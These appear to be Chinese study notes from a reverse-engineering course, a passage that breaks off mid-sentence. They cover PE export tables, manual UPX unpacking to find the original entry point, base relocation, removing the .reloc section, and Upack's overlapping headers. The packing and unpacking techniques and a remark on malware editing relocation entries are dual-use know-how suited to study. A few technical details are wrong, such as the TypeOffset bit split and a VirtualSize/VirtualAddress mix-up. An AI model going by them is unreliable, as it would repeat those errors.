EATQ1：为什么有这个呢？\n\n前面的IAT是为了记录程序中使用了哪些库的哪些函数，也就是一个程序内部的事\n但是如果多个程序要使用库呢？\n\nWindows操作系统中，“库”是为了方便其他程序调用而集中包含相关函数的文件(DLL&#x2F;SYS)。\nWin32API是最具代表性的库，其中的kernel32.dll文件被称为最核心的库文件。\nEAT是一种核心机制它使不同的应用程序可以调用库文件中提供的函数。\n也就是说，只有通过EAT才能准确求得从相应库中导出函数的起始地址。\n与前面讲解的IAT一样，PE文件内的特定结构体(IMAGE_EXPORT_DIRECTORY)保存导出信息，且PE文件中仅有一个用来说明库EAT的IMAGE_EXPORT_DIRECTORY结构体。\n\n\n\n\n\n\n提示\n用来说明IAT的IMAGE_IMPORT_DESCRIPTOR结构体以数组形式存在，且拥有多个成员。这样是因为PE文件可以同时导入多个库。\n\n\nQ2：IMAGE_EXPORT_DIRECTORY在PE中的哪个位置？\n\n可以在PE文件的PE头中查找到IMAGE_EXPORT_DIRECTORY结构体的位置。\n\nIMAGE_OPTIONAL_HEADER32.DataDirectory[0].VirtualAddress值即是IMAGE_EXPORT_DIRECTORY结构体数组的起始地址(也是RVA的值)。图13-20显示的是kernel32dll文件的IMAGE_OPTIONAL_HEADER32.DataDirectory[0]\n\n\n这个深色框中的内容是DataDirectory[0]，也就是IMAGE_EXPORY_DIRECTORY\n\n\n由于RVA值为262C，文件偏移为1A2C。\n\n\n13.6.1 IMAGE_EXPORT_DIRECTORY IMAGE_EXPORT_DIRECTORY的结构体如下：\n\n其中的重要成员就是上图中的红框\n\n IMAGE_EXPORT_DIRECTORY的结构体和整个EAT结构：\n\nQ：上面PE导入函数至IAT中提到了获取函数的地址\n\n\n\n这个API GetProcAddress()就是使用EAT来获取指定函数的地址\nQ：那如何获取？\nGetProcAddress()操作原理\n\n利用AddressOfNames成员转到函数名称数组\n在·\n利用AddressOfNameOrdinals成员，转到orinal数组\n在ordinal数组中通过name_index查找相应ordinal值。\n利用AddressOfFunctions成员转到“函数地址数组”(EAT)。\n在“函数地址数组”中将刚刚求得的ordinal用作数组索引，获得指定函数的起始地址。\n\n13.6.2 使用kernel32.dll练习目标：从kernel32.dll文件中查找AddAtomW函数\n\n深色部分就是IMAGE_EXPORT_DIRECTORY\n\n\n函数名称数组\n\n\nAddressOfNames成员的值为RVA&#x3D;353C，即RAW&#x3D;293C。使用Hex Editor查看该地址\n\n\n\n数组元素个数为NumberOfNames，3BA\n\n\n查找指定函数名称\n\n\n要查找的函数名称字符串为AddAtomW。\n\n只要在图13-23中找到RVA数组第三个元素的值(RVA:4BBD-&gt;RAW:3FBD) 即可。也就是粗线框中的\n\n进入相应地址就会看到“AddAtomw”字符串，如图13-24所示。\n\n此时“AddAtomw”函数名即是图13-23数组的第三个元素，数组索引为2。\n\n\n\n我理解这个过程应该就是字符串匹配。\n\nOrdinal数组\n\n\n通过上面的数组索引获得ordinal的值。\n\nAddressOfNameOrdinal的值是3824。深色部分是由多个2字节组成的数组，ordinal数组的各元素大小为2bytes\n\n\n\n\nordinal\n\n\n根据索引是2，获取0002\n\n\n函数地址数组EAT\n\n\n查找函数的实际地址，AddressOfFunctions成员的值是1A54\n\n通过ordinal的值2，找到实际的函数地址，000326F1\n\n\n\n\nAddAtomW函数地址\n\n\n此时已经得到Orinal=2 AddressOfFunctions=00326F1 \n\nkernel32.dll的lmageBase=7C7D0000。因此AddAtomw函数的实际地址(VA)为ImageBase+AddressOfFunctions(RVA)=7C8026F1\n\n使用OllyDbg查看地址，即可发现该函数\n\n\n\n上述的整个过程就是GetProcAddress() API获取函数地址的方法\n关于IAT(import)和EAT(export)Import：记录导入当前程序中的函数，相对于当前程序而言\nExport：导出，从库中导出，相对于库而言，记录了从库中导出函数实际的地址。\n13.7 高级PE13.7.1 PEView.exehttp://www.magma.ca/~wjr/PEView.zip\n好像失效了\n\n\n在这里可以看到各种PE头的信息，很直观\n\n13.7.2 Patched PE只要文件符合PE规范就是PE文件，因此可以做出一些很有创意的PE文件。\nhttp://www.phreedom.org/solar/code/tinype\n这个网站记录了PE头和tiny pe的制作过程，下载下来分析对提高逆向很有帮助。\n13.8 小结\nPE规范只是一种标准规范(许多东西都没使用)\n\nQ：前面的讲解中提到,执行文件加载到内存时会根据Imagebase确定地址,那么2个notepad程序同时运行时Imagebase都是10000000，它们会侵占彼此的空间区域，不是这样吗?\n\n生成进程(加载到内存)时，OS会单独为它分配4GB大小的虚拟内存。\n虚拟内存与实际物理内存是不同的。同时运行2个notepad时，各进程分别在自身独有的虚拟内存空间中。\n所以它们彼此不会重叠。这是由OS来保障的。因此，即使它们的Imagebase一样也完全没问题。\n\nQ：如何只用HexEditor识别出DOS存根、IMAGE_FILE_HEADER等部分呢?\n\n根据PE规范，IMAGE_DOS_HEADER的大小为40个字节，DOS存根区域为40~DE签名区域。\n紧接在PE签名后的是IMAGE_FILE_HEADER，且该结构体的大小是已知的，所以也可以在Hex Editor中表示出来\n也就是说，解析PE规范中定义的结构体及其成员的含义即可区分出各组成部分(多看几次就熟悉了)。\n\nQ：IMAGE_FILE_HEADER的TimeDateStamp值为0x47918EA2，在PEView中显示为2008&#x2F;01&#x2F;19,05:46:10 UTC，如何才能这样解析出来呢?\n\n使用C语言标准库中提供的ctime()函数,即可把4个字节的数字转换为实际的日期字符串。\n\nQ：PE映像是什么?\n\nPE映像这一术语是微软创建PE结构时开始使用的。一般是指PE文件运行时加载到内存中的形态。\nPE头信息中有一个SizeOflmage项，该项指出了PE映像所占内存的大小。\n当然这个大小与文件的大小不一样。PE文件格式妙处之一就在于，其文件形态与内存形态是不同的。\n\nQ：不太明白EP这一概念\n\nEP地址是程序中最早被执行的代码地址。CPU会最先到EP地址处，并从该处开始依次执行指令。\n\nQ：用PEView打开记事本程序(notepad.exe)后，发现各节区的起始地址、大小等与示例中的不同，为什么会这样呢?\n\nnotepad.exe文件随OS版本的不同而不同(其他所有系统文件也如此)。\n换言之，不同版本的OS下，系统文件的版本也是不同的。\n微软可能修改了代码、更改了编译选项，重新编译后再发布。\n\nQ：对图13-9及其下面的Quiz不是很理解。如何知道RVA 5000包含在哪个节区呢?\n\n图13-9是以节区头信息为基础绘制的。图(或节区头信息)中的.text节区是指VA 01001000~01009000区域\n转换为RVA形式后对应于RVA 1000~9000区域(即减去Imagebase值的01000000)。\n由此可知，RVA5000包含在text节区中。\n\nQ：查看某个文件时，发现其IMAGE_IMPORT_DESCRIPTOR结构体的OriginalFirstThunk成员为NULL，跟踪FirstFThunk成员，看到一个实际使用的API的名称字符串数组(INT)。跟踪FirstThunk应该看到的是IAT而不是INT，这是怎么回事呢?\n\nPE装载器无法根据OriginalFirstThunk查找到API名称字符串数组(INT)时，就会尝试用FirstThunk查找。\n本来FirstThunk含义为IAT，但在实际内存中被实际的API函数地址覆盖掉了(此时INT与IAT虽然是相同区域，但仍然能够正常工作)。\n\nQ：EAT讲解中提到的Ordinal究竟是什么?\n\n把Ordinal想成导出函数的固有编号就可以了。\n\n有时候某些函数对外不会公开函数名，仅公开函数的固有编号(Ordinal)。导入并使用这类函数时，要先用Ordinal查找到相应函数的地址后再调用。\n\n比如下面(1)通过函数名称来获取函数地址，(2)则使用函数的Ordinal来取得函数地址。\n(1)pFunc&#x3D;GetProcAddress(“TestFunc”);\n(2)pFunc&#x3D;GetProcAddress(5);\n\n总结\n这一章学的内容一定要反复看，反复理解。\n虚拟内存的概念，好久之前学的操作系统，已经完全忘记了。\n\n0x14 运行时压缩运行时压缩器(Run-Time Packer)\n14.1 数据压缩经过压缩的文件若能100%恢复，则称该压缩为无损压缩(Lossless Data Compression)\n若不能恢复原状，则称该压缩为有损压缩(Loss Data Compression)\n14.1.2 有损压缩有损压缩允许压缩文件(数据)时损失一定信息，以此换取高压缩率。\n压缩多媒体文件(jpg、mp3、mp4)时，大部分都使用这种有损压缩方式。\n从压缩特性来看，有损压缩的数据解压缩后不能完全恢复原始数据。人类的肉眼与听觉几乎无法察觉到这些多媒体文件在压缩中损失的数据。经过有损压缩后，虽然压缩文件与原文件(从数据层面上看存在差异，但重要的是人们几乎区分不出这种微小的差别。\n以mp3文件为例，mp3的核心算法通过删除超越人类听觉范围(20~20000Hz)的波长区段来缩减(不需要的)数据大小。\n14.2 运行时压缩器运行时压缩器是针对可执行(PE Portable Executable)文件而言的。\n可执行文件内部含有解压缩代码，文件在运行瞬间于内存中解压缩后执行。\n运行时压缩文件也是PE文件，内部含有原PE文件与解码程序。\n在程序的EP代码中执行解码程序，同时在内存中解压缩后执行。\n我个人觉得这句话有点问题，这里的解码应该就是解压缩。\nQ：表14-1列出了运行时压缩与普通ZIP压缩的不同点。\n\n\n与普通压缩器相比，运行时压缩器的一个明显不同是PE文件的可运行性。\n\nQ：压缩器和保护器\n\n把普通PE文件创建成运行时压缩文件的实用程序称为“压缩器”(Packer)，经反逆向(Anti-Reversing)技术特别处理的压缩器称为保护器(Protector)。\n\n14.2.1 压缩器PE压缩器是指可执行文件的压缩器，准确一点应该称为“运行时压缩器”，它是PE文件的专用压缩器。\nQ：使用压缩器的目的\n\n便于传输\n隐藏代码\n\nQ：压缩器种类\n\n14.2.2 保护器Q：保护器的概念和作用\n\nPE保护器是一类保护PE文件免受代码逆向分析的实用程序。\n它们不像普通的压缩器一样仅对PE文件进行运行时压缩，而应用了多种防止代码逆向分析的技术(反调试、反模拟、代码混乱、多态代码、垃圾代码、调试器监视）等。\n这类保护器使压缩后的PE文件尺寸反而比源文件要大一些，调试起来非常难。\n分析保护器的关键是OEP(OrigialEntry Point，原始人口点)\n\nQ：保护器种类\n\n14.3 运行时压缩测试可以用upx压缩notepad.exe\nQ：运行时压缩的特点\n\n运行时压缩后的文件尺寸明显减小了(67584-&gt;48128)。若使用ZIP压缩，则文件大小缩减为35231。\n也就是说，运行时的压缩率要比普通的ZIP压缩低。\n这是由于其压缩后得到的是PE文件，需要添加PE头，并且还要放入解压缩代码\n\nQ：比较notepad.exe和notepad_upx.exe文件\n该图是从PE视角进行比较\n\n\nPE头的大小一样(0~400h)。h表示16进制\n节区名称改变(“text”一&gt;“UPX0”，“.data”一&gt;“UPX1”)\n第一个节区的RawDataSize&#x3D;0(文件中的大小为0)。\nEP位于第二个节区(原notepad.exe的EP在第一个节区)\n资源节区(.rsrc)大小几乎无变化。\n\n\n\n\n\n\n\n提示\n右边这个notepad_upx展示的地址是Pointer to Raw Data，也就是在磁盘中的地址，用PEview查看如下所示。\n\nQ：upx0的RawDataSize为0，upx为何要创建这个空的节区呢？\n使用PEview查看notepad_upx.exe\n\n\n这里发现Virtual Size，也就是内存中的大小是106000，而Size of Raw Data，磁盘中的大小是00000000\n也就是说在内存中解压缩时，会把文件中压缩状态的源代码解压到(内存中的)第一个节区。\n也就是在文件状态下，最开始解压缩代码和压缩的源代码都在第二个节区，文件运行时首先执行解压缩代码，把处于压缩状态的源代码解压到第一个节区。\n解压过程结束后即运行源文件的EP代码。\n\n0x15 调试upx压缩的notepad程序原notepad.exe的源码\n\n在010073B2地址处调用了GetModuleHandleA()API，获取notepadexe程序的ImageBase。\n在010073B4与010073C0地址处比较MZ与PE签名。\n\n15.2 notepad_upx.exe的EP代码因为UPX1的RVA是11000，ImageBase是01000000。\n此时打开后,EP地址为01015330，该处就是第二个节区的末端部分。实际压缩的notepad源代码在EP地址上方\n\nQ：首先看开始时候的指令\n\n汇编指令：\nPUSHAD  &#x2F;&#x2F;是一个x86汇编指令，用于将通用寄存器（EAX、ECX、EDX、EBX、ESP、EBP、ESI、EDI）的值依次压入堆栈中。该指令的作用\t\t  \n\t\t&#x2F;&#x2F;是保存这些寄存器的值，以便在稍后的代码中使用或恢复。\n\n\n首先使用PUSHAD命令将EAX~EDI寄存器的值保存到栈\n然后分别把第二个节区的起始地址(01011000)与第一个节区的起始地址(01001000)设置到ESI与EDI寄存器。\n\n汇编指令：\nLEA EDI, DWORD PTR DS:[ESI+FFFF0000]\n加载有效地址（Load Effective Address）指令，用于将指定内存地址的有效地址计算结果存储到目标寄存器 EDI 中\n\n&quot;LEA&quot; 是加载有效地址的指令。\n&quot;EDI&quot; 是目标寄存器，表示要将有效地址计算结果存储到 EDI 寄存器中。\n&quot;DWORD PTR&quot; 是一个操作数大小指示符，表示要操作的是一个双字（32位）数据。\n&quot;DS:[ESI+FFFF0000]&quot; 是指定的内存地址，表示要对 DS:ESI+FFFF0000 指向的内存地址进行有效地址计算。\n\n\n\n\nUPX文件第一个节区仅存在于内存。该处即是解压缩后保存源文件代码的地方。\n\n\n\n调试时像这样同时设置ESI与EDI，就能预见从ESI所指缓冲区到EDI所指缓冲区的内存发生了复制。\n此时从Source( ESI)读取数据，解压缩后保存到Destination EDI\n我们的目标是跟踪全部UPX EP代码，并最终找到原notepad的EP代码，也就是OEP\n\n15.3 跟踪UPX文件当跟踪数量很多的代码时，遵循的法则是遇到循环(Loop)时，先了解作用再跳出\n15.3.1 Ollydbg的跟踪命令\n15.3.2 循环#1\n在EP代码处执行AnimateOver(Ctrl+F8)命令，开始跟踪代码。可以看到光标快速上下移动\n\n汇编指令\nMOV AL,BYTE PTR DS:[EDX] &#x2F;&#x2F;类型转换为BYTE，是8位，AL是AX(16位寄存器)的低8位\nINC EDX &#x2F;&#x2F;给EDX加1\nDEC EDX &#x2F;&#x2F;给EDX减1\n\nQ：开始跟踪后，会遇到一个短循环，暂停(F7)查看\n\n\n红框内是循环，ECX记录了循环次数,表明这个循环会执行36B次\n\n该循环的作用是把EDX的值给EDI，EDX从01001001开始，也就是upx0的起始位置\n\n这个节区只在内存中存在，反正内容都是Null\n\n\n遇到这样的循环应该跳出来，在010153E6地址处按F2设置断点，之后F9跳出循环\n\n\n15.3.3 循环#2\nQ：此时又遇到了一个很大的循环，该怎么办？\n\n看这个循环的起始地址和结束地址，起始地址为534E，结束地址为53FD\n\n汇编代码\nJB SHORT 01015348\n    \n&quot;Jump if Below&quot; 的缩写，它是一条条件跳转指令。这意味着该指令会根据标志寄存器中的条件进行跳转\n\n\n\n\n该循环是正式的解压缩循环，先从ESI所指的第二个节区(UPX1)地址中依次读取值，经过适当的运算解压缩后，将值写入EDI所指的第一个节区(UPX0)地址\n\n\n\n观察循环的最大地址的指令是010153FD，那就在它的下一条指令01015402处设置断点此时让程序运行到该处\n\n此时在转储窗口中可以看到解压缩后的代码已经被写入第一个节区(UPX0)区域，原来这些区域是用null填充的\n\n\n\n15.3.4 循环#3\n\n这里是遇到的第三个循环\n该段循环代码用于恢复源代码的CALL&#x2F;JMP指令(操作码:E8&#x2F;E9)\n只要再设置好IAT,UPX解压缩就结束了\n\nJNZ是x86汇编指令中的条件跳转指令，它的全称是&quot;Jump if Not Zero&quot;，表示在某个条件下，如果结果不为0，也就是零标志位不被设置时，则执行跳转操作。\n\n具体解释如下：\n\nJNZ：是条件跳转指令的助记符，它用于根据零标志位（ZF）的值来进行有条件的跳转。\n零标志位（ZF）：是一个标志位寄存器中的一个标志位，用于指示上一次运算结果是否为零。如果上一次运算结果为零，ZF被设置为1，否则为0。\nJNZ指令的操作步骤如下：\n\n如果ZF为0（上一次运算结果不为零），则执行跳转到指定的目标地址。\n如果ZF为1（上一次运算结果为零），则不执行跳转，继续顺序执行下一条指令。\n\n:::tip\n普通的运行时压缩，源文件将源文件代码、数据、资源解压缩之后，先设置好IAT再转到OEP。\n\n\n15.3.5 循环#4\n\n该部分是设置IAT的循环。在01015436地址处设置EDI=01014000，它指向upx1区域，该区域中保存着原notepad.exe调用的API函数名称的字符串\n\nQ：是如何设置IAT的呢？\n\nUPX压缩原notepad.exe文件时，它会分析其IAT，提取出程序中调用的API名称列表，形成API名称字符串。\n用这些API名称字符串调用上图中01015467地址处的GetProcAddress()函数，获取API的起始地址\n然后把API地址输入EBX寄存器所指的原notepad.exe的IAT区域。\n该过程会反复进行至API名称字符串结束，最终恢复原notepad.exe的IAT。\nnotepad.exe全部解压缩完成后，应该将程序的控制返回到OEP处。图15-9显示的就是跳转到OEP的代码。\n\n\n\n\n\n\n\n提示\n总结一下：upx在压缩时候，会形成一个API列表。恢复的时候，会逐个取出，取出一个调用GetProcAddress()函数获取它的地址，再放到IAT区域，依次对每个API执行这个操作。\n感觉这个过程和PE装载器加载IAT差不多\n\n\nQ：程序执行到最后\n\n\n在010154B8处跳转到0100739D指令处，就是开头0x15中打开notepad.exe的EP地址\n01054AD处的POPAD用于把寄存器恢复成原来的状态\n\n15.4 快速查找UPX OEP的方法15.4.1 在POPAD指令后的JMP指令处设置断点\nUPX压缩器的特征之一是,其EP代码被包含在PUSHAD POPAD指令之间。\n并且，跳转到OEP代码的JMP指令紧接着出现在POPAD指令之后。\n只要在JMP指令处设置好断点，运行后就能直接找到OEP\n\n15.4.2 在栈中设置硬件断点\n\n在执行完PUSHAD指令后，此时栈的状态是，当前地址是000DFF58\n\n在左侧找到000DFF58这个地址，选中Hex dump的第一块，右键\n\n\n\n然后运行程序，程序就会停在JMP OEP  附近\n\n\n\n\n\n\n\n\n\n提示\n\n硬件断点是CPU支持的断点，最多可以设置4个。\n与普通断点不同的是，设置断点的指令执行完成后才暂停调试\n在这种状态下运行，程序就会边解压缩边执行代码，在执行POPAD的瞬间访问设置有硬件断点的000DFF58地址，然后暂停调试。其下方即是跳转到OEP的JMP指令\n\n\n\n15.5 小结Q：解压缩(Unpacking)过程中打开Dump窗口，若不重新设置IAT就会出现初始化错误。这到底是怎么一回事?\n\n比如，运行UPX文件后转储时，IAT中存在(对应于当前系统的)准确的API地址。但是INT却处于损坏状态。\nPE装载器使用INT中的API名称字符串(LoadLibrary()&#x2F;GetProcAddress())来获取实际API地址，并将它们记录到IAT。\n由于INT已经损坏，该过程中自然会发生错误。\n\nQ：如何知道ESI、EDI所指的地址对应于哪个节区的地址呢?我想知道该如何才能识别出恢复IAT的代码以及解码循环。\n\n内存复制命令中，ESI指Source，EDI指Destination。\n所以使用PEView(或者OllyDbg的内存映射窗口)查看ESI EDI所指的地址，即可知道它们对应的节区。\n从反复调用GetProcAddress()函数可知正在恢复IAT\n\n0x16 基址重定位表PE文件在重定位时会用到基址重定位表\n16.1 PE重定位Q：为什么会有PE重定位？\n\n向进程的虚拟内存加载PE文件(EXE&#x2F;DLL&#x2F;SYS)时文件会被加载到PE头的ImageBase所指的地址处。\n若加载的是DLL(SYS)文件，且在ImageBase位置处已经加载了其他DLL(SYS)文件，那么PE装载器就会将其加载到其他未被占用的空间。\n这就涉及PE文件重定位的问题，PE重定位是指PE文件无法加载到ImageBase所指位置,而是被加载到其他地址时发生的一系列的处理行为。\n\n\n16.1.2 EXEQ：EXE加载的优先级\n\n创建好进程后，EXE文件会首先加载到内存，所以在EXE中无须考虑重定位的问题。\n但是Windows Vista之后的版本引人了ASLR安全机制，每次运行EXE文件都会被加载到随机地址，这样大大增强了系统安全性。\n\nQ：DLL不会重定位\n\nASLR(Address Space Layout Randomization)机制也适用于DLL&#x2F;SYS文件。\n对于各OS的主要系统DLL，微软会根据不同版本分别赋予不同的ImageBase 地址。\n同一系统的 kerel32dl、user32.dll等会被加载到自身固有的ImageBase，所以，系统的DLL实际不会发生重定位问题。\n在P207有一个表，详细说明了这个问题\n\n\n\n16.2 PE重定位时执行的操作使用Ollydbg运行notepad.exe程序\nQ：这里是程序刚打开时的位置，也就是EP代码部分？\n\n在Windows7的ASLR机制下，程序被加载到00A23000地址处。\n\n每次在Ollydbg中重启notepad.exe，地址值就会随加载地址的不同而改变。\n\n像这样硬编码在程序中的内存地址随当前加载地址变化而改变的处理过程就是PE重定位。\n\n\n\n\n用PE View打开notepad.exe，可以看到Image Base是01000000\n\n\n该文件(不是指磁盘中的文件)中与实际显示的硬编码地址\n文件：(ImageBase:01000000)    进程内存(加载地址: 00A20000)\n\t010010FC\t\t\t\t\t00A210FC\n\n\n\n\n\n\n\n提示\nPEView打开的Notepad.exe中硬编码的地址以ImageBase(01000000)为基准。生成notepad.exe文件时，由于无法预测程序被实际加载到哪个地址，所以记录硬编码地址时以ImageBase为基准。但在运行的瞬间，经过 PE重定位后，这些地址全部以加载地址为基准变换，最后程序得以正常执行。\n\n\n16.3 PE重定位操作\n\n\n\n\n\n提示\n这一部分截图的地址可能和上一部分不一样，换电脑运行的\n\n\nQ：windows的PE装载器进行PE重定位时的操作基本原理\n\n在应用程序中查找硬编码的地址位置。读\n取值后，减去ImageBase(VA-&gt;RVA)\n加上实际加载地址(RVA-&gt;VA)\n\nQ：上个Q中最关键的是查找硬编码地址的位置\n\n查找过程中会用到PE文件内部的Relocation Table(重定位表)\n它是记录硬编码地址偏移(位置)的列表，(重定位表是在PE文件构建过程(编译&#x2F;链接)中提供的)。\n通过重定位表查找，其实就是指根据PE头的“基址重定位表”项进行的查找\n\n16.3.1 基址重定位表Q：基址重定位表的位置\n\n基址重定位表地址位于PE头的DataDirectory数组的第六个元素(数组索引为5)\n\n\n\n16.3.2 IMAGE_BASE_RELOACTION结构体Q：基址重定位表的含义\n\n上图的的基址重定位表中罗列了硬编码地址的偏移(位置)。\n读取这张表就能获得准确的硬编码地址偏移。\n基址重定位表是IMAGE_BASE_RELOCATION结构体数组。\n\nQ：IMAGE_BASE_RELOCATION结构体定义\n\n\nIMAGE_ BASE_RELOCATION结构体的第一个成员为VirtualAddress，它是一个基准地址(BaseAddress)，实际是RVA值。\n第二个成员为SizeOfBlock，指重定位块的大小。\n最后一项TypeOffset数组不是结构体成员，而是以注释形式存在的，表示在该结构体之下会出现WORD类型的数组，并且该数组元素的值就是硬编码在程序中的地址偏移。\n\n16.3.3 基址重定位表的分析方法Q：基址重定位表\n\n\n由IMAGE_BASE_RELOCATION结构体的定义可知，VirtualAddress成员(基准地址)的值为1000，SizeOfBlock成员的值为150。\n表16-2中显示的TypeOffest数组的基准地址(起始地址)为RVA 1000，块的总大小为150(这些块按照基准地址分类，以数组形式存在)。块的末端显示为0。\nTypeOffset值为2个字节(16位)大小，是由4位的Type与12位的Offset合成的。\n\nQ：比如TypeOffset值为3420，解析如下表所示。\n\n\n高4位用作Type\nPE文件中常见的值为3(IMAGE_REL_BASED_HIGHLOW)\n64位的PE+文件中常见值为A(IMAGE_REL_BASED_DIR64)\n\n\n\n\n\n\n\n\n\n提示\n在恶意代码中正常修改文件代码后，有时要修改指向相应区域的重定位表(为了略去PE装载器的重定位过程，常常把Type值修改为0(IMAGE_REL BASED_ABSOLUTE))。\n\n\n\n低4位是真正的位移，该位移值基于Virtual Address的偏移。程序中硬编码地址的偏移使用下面的等式换算：\nVirtualSize(1000) + Offset(420)&#x3D;1420(RVA)\n\nQ：看一下RVA 1420处是否存在执行PE重定位操作的硬编码地址\n\n\n这里notepad.exe被记载到00AF0000，\n该地址处存储着IAT地址(VA，AF10C4)。并且该值经过PE重定位而发生了变化。\n使用相同原理AF142D、AF1436地址的内容也都是硬编码到程序中的地址值，该偏移可以在表16-2中求得。\n\n\n\n\n\n\n\n提示\nTypeOffset项中指向位移的低12位拥有的最大地址值为 1000。为了表示更大的地址，要添加1个与其对应的块，由于这些块以数组形式罗列，故称为重定位表。\n说人话\n\n相当于这个表里存的是映射，原来只能是从000-999，现在我可以扩展地址范围了，映射到其他地方去了\n\n\n\n16.3.4 练习Q：前提假设\n\n运行Notepad.exe时，被加载到00AF0000，而不是ImageBase地址(01000000)那PE重定位是如何进行的呢？\n\nQ：分析\n\n查找程序中硬编码地址的位置\n\n程序中使用的硬编码地址的偏移(位置)可以通过基址重定位表查找到(此处使用上面求得的RVA1420)。\n\n使用PEView查看RVA1420地址中的内容，如图16-9所示。\n\n1420中存着的硬编码的值010010C4\n\n\n\n\n减去ImageBase\n010010C4 - 01000000 &#x3D; 000010C4\n\n加上实际的地址\n000010C4 + 00AF0000 &#x3D; 00AF10C4\n\n\n对于程序内硬编码的地址(010010C4)PE装载器都做如上处理，根据实际加载的内存地址修正后，将得到的值(00AF10C4)覆盖到同一位置。\n\n对一个IMAGE_BASE_RELOCATION结构体的所有TypeOffset都重复上述过程，且对与RVA1000~2000地址区域对应的所有硬编码地址都要进行PE重定位处理\n\n若TypeOffset值为0，则表明一个IMAGE_BASE_RELOCATION结构体结束。\n\n也就是这个表中有很多个IMAGE_BASE_RELOCATION结构体，当有0的时候，表明这个IMAGE_BASE_RELOCATION结构体结束了，该下一个IMAGE_BASE_RELOCATION结构体了。\n\n\n\n对重定位表中出现的所有IMAGE_BASE_RELOCATION结构体都重复上述处理后，就完成了对进程内存区域相应的所有硬编码地址的PE重定位。\n\n重定位表以NULL结构体结束(即IMAGE_BASE_RELOCATION结构体成员的值全部为NULL)。\n\n\n总结\n\n我在基址重定位表中记录了virtualaddress，和typefileoffset\n每一个fileoffset的RVA都有一个硬编码的地址，对应一个文件，也就是按照ImageBase加载的时候，他应该的地址值\n这个RVA通过virtualaddress + fileoffset后3位得到\n\n\n那在重定位的时候，我用这个存着的硬编码值-ImageBase+实际加载的地址，就是重定位后的地址\n\n0x17 从可执行文件中删除.reloc节区17.1 .reloc节区Q：删除.exe文件的基址重定位表项。\n\nEXE形式的PE文件中，“基址重定位表”项对运行没什么影响。\n\n实际上，将其删除后程序仍然正常运行(基址重定位表对DLL&#x2F;SYS形式的文件来说几乎是必需的)。\n\n因为之前提到过，.exe是率先被加载的，不会存在重定位的情况\n\n\n\nQ：.reloc节区\n\nVC++中生成的PE文件的重定位节区名为.reloc，删除该节区后文件照常运行，且文件大小将缩减(实际上存在这种实用小程序)。\n\n.reloc节区一般位于所有节区的最后\n\n只使用PEView与Hex Editor(手动删除)就足够了。\n\n\n17.2 reloc.exeQ：删除.reloc节区的步骤\n\n整理.reloc节区头;\n删除.reloc节区\n修改IMAGE_FILE_HEADER\n修改IMAGE_OPTIONAL_HEADER\n\n17.2.1 用0覆盖.reloc节区头hex editor下载 https://blog.csdn.net/2301_77485708/article/details/132368259\n\n可以看到从RVA 270开始到297，为什么是297?\n全部用0覆盖填充\n\n\n\n\n现在用Ollydbg是无法打开的\n\n17.2.2 删除.reloc节区从上图可以看出，文件中.reloc节区的起始偏移位C000，从这到末尾就是这个节区\n直接用Hex Editor的delete删除所有的数据\n\n.reloc节区即被物理删除。但是由于尚未修改其他PE头信息，文件仍无法正常运行。\n下面开始修改相关PE头信息，使文件最终能够正常运行。\n17.2.3 修改IMAGE_FILE_HEADERQ：修改流程\n\n首先要修改Number Of Sections，这个数字表示节区数量\n把5修改成4\n\n\n\n17.2.4 修改IMAGE_OPTIONAL_HEADERQ：修改整个映像的大小\n\n删除.reloc节区后，(进程虚拟内存中)整个映像就随之减少相应大小。\n\n映像大小值存储在IMAGE_OPTIONAL_HEADER-sizeofImage中，需要对其修改。\n\n从图17-6可以看出，当前Size ofmage的值为11000。\n\n要减去刚才删除的.reloc节区的值，才能让程序常运行。\n\n从17.2.1的图可知，reloc节区的VirtualSize值为E40，将其根据Section Alignment扩展后变为1000。所以应该从Size ofImage减去1000\n\n\n\n\n\n修改后的文件可以在ollydbg中打开\n\nQ：关于数值选择内存还是磁盘中的问题\n\n当文件在电脑桌面上时，是存储在磁盘上的\n当双击这个文件，操作系统会把文件加载到内存中。加载到内存中意味着文件的内容被读取到计算机的随机存取内存（RAM）中，以便应用程序可以更快地访问和处理文件的数据。\n所以上述我用peview打开.exe文件时，会把它读到内存中\n\n0x18 Upack PE文件头详细分析UPack是一款PE文件的运行时压缩器。\n18.2 使用UPack压缩notepad.exeQ：打开upack压缩后的文件\n\n\n发现无法正常读取PE头，并没有optional_header、section_header等信息\n\n18.3 使用Stud_PE工具\n它可以分析Upack文件的PE头\n\n\n\n18.4 比较PE文件头Q：这是notepad.exe的文件头\n\n5A4D是MZ签名，前40个字节是dos头\n40-DE是DOS存根\n40-D0是汇编代码\nE0-E3是PE签名\n\n\nQ：这是notepad_unpack.exe运行时压缩的PE文件头\n\nPE签名离MZ非常近\n没有DOS存根\n有很多不知道的字符串\n\n\n18.5 分析UPack的PE文件头18.5.1 重叠文件头Q：啥是重叠文件头\n\n重叠文件头也是其他压缩器经常使用的技法，借助该方法可以把MZ文件头(IMAGE_DOS_HEADER)与PE文件头(IMAGE_NT_HEADERS)巧妙重叠在一起\n可以有效节约文件头空间\n但是这会额外增加文件头的复杂性，给分析带来很大困难(很难再使用PE相关工具)。\n\nQ：使用Stud PE看一下MZ文件头部分\n\n请按Headers选项卡的Basic HEADERS tree view in hexeditor按钮，如图18-8所示。\n\n\n\nMZ文件头(DOS头)中两个重要成员是：\ne_magic ： 说明MZ，通常是4D5A\ne_flanew： file address of new exe header(文件头的起始地址，也就是NT头的起始地址)\n\n根据PE规范，IMAGE_NT_HEADERS是可变的，起始位置由e_flanew的值决定。一般在一个正常程序中，e_flanew值按照下面计算\ne_lfanew &#x3D; MZ文件头大小+ DOS存根大小 &#x3D; E0\n\n但是根据上图，upack中设置的e_lfanew的值为00000010，说明他把MZ文件头设置在了00000010处，刚好在DOS头里面，此时两个文件头重叠，看下面的图也可以看出来\nDOS header：\n\n\n\n​\t\tFile header：\n\n18.5.2 IMAGE_FILE_HEADER.SizeOfOptionalHeaderQ：upack的作者把IMAGE_FILE_HEADER.SizeOfOptionalHeader的值修改了，为啥？\n\n从下图可知，正常情况下这个值是E0，根据13.3中的笔记，这部分是用来指定IMAGE_OPTIONAL_HEADER32结构体的大小\n为了可以空出一段空间，向其中插入解码代码\n\n\nQ：根据前面的知识，IMAGE_OPTIONAL_HEADER32结构体是由C语言写的，固定的，为什么还要单独设置一个属性说明它的值呢？\n\n根据前面的知识\n\n\n\nQ：为什么upack把SizeOfOptionalHeader的值设置为148\nIMAGE_SECTION_HEADER的起始地址 &#x3D; IMAGE_OPTIONAL_HEADER起始地址 + 